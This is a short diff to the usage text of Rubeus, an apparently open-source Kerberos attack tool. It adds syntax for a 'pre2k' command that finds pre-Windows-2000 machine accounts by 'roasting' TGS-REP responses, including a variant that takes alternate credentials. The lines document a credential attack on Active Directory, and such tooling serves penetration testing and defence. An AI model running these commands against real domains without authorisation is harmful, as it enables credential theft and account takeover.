@@ -198,6 +198,15 @@ namespace Rubeus.Domain
     Perform AES AS-REP ""roasting"":
         Rubeus.exe asreproast [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:""OU=,...""] /aes [/ldaps] [/nowrap]
 
+    Identify Pre-2k machine accounts, by performing TGS-REP ""roasing"" for all domain computers:
+    	Rubeus.exe pre2k [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:""OU=,...""] [ldapfilter:LDAP_FILTER] [/ldaps] [/randomspn] [/verbose] [/outfile:pre2k.txt]
+
+    Identify Pre-2k machine accounts, by performing TGS-REP ""roasing"" for specific computers:
+    	Rubeus.exe pre2k <computers:comp1,comp2,comp3 | /computers:C:\Temp\computers.txt> [/service:host] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/verbose] [/outfile:pre2k.txt] 
+     
+    Identify Pre-2k machine accounts, by performing TGS-REP ""roasing"" for all domain computers using alternate credentials:
+    	Rubeus.exe pre2k /creduser:DOMAIN.FQDN\USER /credpassword:PASSWORD [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:""OU=,...""] [ldapfilter:LDAP_FILTER] [/ldaps] [/randomspn] [/verbose] [/outfile:pre2k.txt]
+
 
  Miscellaneous:
 
